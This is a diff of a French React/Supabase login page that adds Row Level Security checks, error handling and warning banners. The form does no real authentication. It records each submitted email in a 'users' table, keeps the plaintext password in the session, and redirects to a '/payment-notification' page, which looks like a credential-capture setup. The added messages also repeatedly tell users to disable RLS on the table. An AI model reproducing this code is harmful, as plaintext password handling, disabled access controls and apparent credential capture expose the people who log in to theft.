@@ -9,18 +9,24 @@ const Login: React.FC = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-  const [tableExists, setTableExists] = useState<boolean | null>(null);
+  const [tableStatus, setTableStatus] = useState<{exists: boolean, hasRls: boolean} | null>(null);
+  const [errorMessage, setErrorMessage] = useState<string | null>(null);
   const navigate = useNavigate();
 
   useEffect(() => {
     // Vérifier si la table users existe lors du chargement de la page
     const checkTable = async () => {
-      const exists = await verifyUsersTableExists();
-      setTableExists(exists);
+      const status = await verifyUsersTableExists();
+      setTableStatus(status);
       
-      if (!exists) {
+      if (!status.exists) {
         toast.error("Configuration Supabase: Table 'users' non trouvée. Veuillez configurer votre base de données.");
         console.error("La table 'users' n'existe pas dans Supabase. Veuillez créer cette table.");
+        setErrorMessage("La table 'users' n'existe pas dans Supabase.");
+      } else if (status.hasRls) {
+        toast.warning("La table 'users' a des politiques RLS qui peuvent bloquer les opérations.");
+        console.warn("La table users a des politiques Row Level Security (RLS) activées.");
+        setErrorMessage("Attention: Row Level Security (RLS) est activée sur la table 'users'.");
       }
     };
     
@@ -30,6 +36,7 @@ const Login: React.FC = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
+    setErrorMessage(null);
 
     if (!email || !password) {
       toast.error("Veuillez remplir tous les champs");
@@ -38,7 +45,7 @@ const Login: React.FC = () => {
     }
 
     // Vérifier si la table existe avant de continuer
-    if (tableExists === false) {
+    if (tableStatus && !tableStatus.exists) {
       toast.error("La base de données n'est pas configurée correctement");
       setIsLoading(false);
       return;
@@ -52,10 +59,39 @@ const Login: React.FC = () => {
       };
       
       // Vérifie si l'utilisateur existe déjà
-      const existingUser = await getUserByEmail(email);
+      let existingUser = null;
+      try {
+        existingUser = await getUserByEmail(email);
+      } catch (error: any) {
+        console.error("Erreur lors de la vérification de l'utilisateur:", error);
+        
+        // Gestion spécifique des erreurs RLS
+        if (error.isRlsError) {
+          setErrorMessage(`Erreur de sécurité (RLS): Vous n'avez pas les permissions nécessaires pour accéder aux données. 
+                          Veuillez désactiver RLS dans Supabase ou configurer les politiques appropriées.`);
+          toast.error("Erreur de sécurité: Row Level Security");
+          setIsLoading(false);
+          return;
+        }
+      }
       
       // Enregistre ou met à jour l'utilisateur dans Supabase
-      await upsertUser(userData);
+      try {
+        await upsertUser(userData);
+      } catch (error: any) {
+        console.error("Erreur lors de l'enregistrement de l'utilisateur:", error);
+        
+        // Gestion spécifique des erreurs RLS
+        if (error.isRlsError) {
+          setErrorMessage(`Erreur de sécurité (RLS): Vous n'avez pas les permissions nécessaires pour modifier les données. 
+                          Veuillez désactiver RLS dans Supabase ou configurer les politiques appropriées.`);
+          toast.error("Erreur de sécurité: Row Level Security");
+          setIsLoading(false);
+          return;
+        }
+        
+        throw error;
+      }
       
       // Stocke les informations dans la session
       updateUserSession({ email, password });
@@ -64,8 +100,13 @@ const Login: React.FC = () => {
       
       // Naviguer vers la page suivante
       navigate("/payment-notification");
-    } catch (error) {
+    } catch (error: any) {
       console.error("Erreur lors de la connexion:", error);
+      
+      // Message d'erreur détaillé pour faciliter le débogage
+      const detailedError = error.message || "Une erreur inconnue est survenue";
+      setErrorMessage(`Erreur lors de la connexion: ${detailedError}`);
+      
       toast.error("Une erreur est survenue lors de la connexion");
     } finally {
       setIsLoading(false);
@@ -95,7 +136,7 @@ const Login: React.FC = () => {
         <div className="w-full max-w-md p-8 bg-white rounded-lg shadow-sm border border-gray-100 animate-scale-in">
           <h1 className="text-3xl font-bold text-center mb-6">Bonjour !</h1>
           
-          {tableExists === false && (
+          {tableStatus && !tableStatus.exists && (
             <div className="mb-6 p-3 bg-red-100 text-red-700 rounded-md">
               <p className="text-center">
                 <strong>Attention:</strong> La table 'users' n'est pas configurée dans Supabase.
@@ -103,6 +144,39 @@ const Login: React.FC = () => {
               <p className="text-center text-sm mt-1">
                 Veuillez vérifier votre configuration Supabase et créer la table 'users'.
               </p>
+            </div>
+          )}
+          
+          {tableStatus && tableStatus.hasRls && (
+            <div className="mb-6 p-3 bg-yellow-100 text-yellow-800 rounded-md">
+              <p className="text-center">
+                <strong>Attention:</strong> Row Level Security (RLS) est activée sur la table 'users'.
+              </p>
+              <p className="text-center text-sm mt-1">
+                Cela peut empêcher l'insertion/modification des données. Veuillez désactiver RLS ou configurer les politiques appropriées.
+              </p>
+            </div>
+          )}
+          
+          {errorMessage && (
+            <div className="mb-6 p-3 bg-red-100 text-red-700 rounded-md">
+              <p className="text-sm whitespace-pre-line">
+                {errorMessage}
+              </p>
+              <div className="mt-2 text-xs text-red-600">
+                <details>
+                  <summary>Informations techniques</summary>
+                  <p className="mt-1">
+                    L'erreur "row-level security policy" indique que les politiques de sécurité RLS de Supabase 
+                    empêchent l'opération. Veuillez:
+                  </p>
+                  <ol className="list-decimal pl-5 mt-1 space-y-1">
+                    <li>Aller dans le dashboard Supabase ➔ Table Editor ➔ table 'users'</li>
+                    <li>Cliquer sur "Authentication"</li>
+                    <li>Désactiver RLS ou cliquer sur "New Policy" pour ajouter les permissions nécessaires</li>
+                  </ol>
+                </details>
+              </div>
             </div>
           )}
           
@@ -148,7 +222,7 @@ const Login: React.FC = () => {
             <button
               type="submit"
               className="primary-button flex items-center justify-center"
-              disabled={isLoading || tableExists === false}
+              disabled={isLoading || (tableStatus && !tableStatus.exists)}
             >
               {isLoading ? (
                 <span className="loading-spinner" />
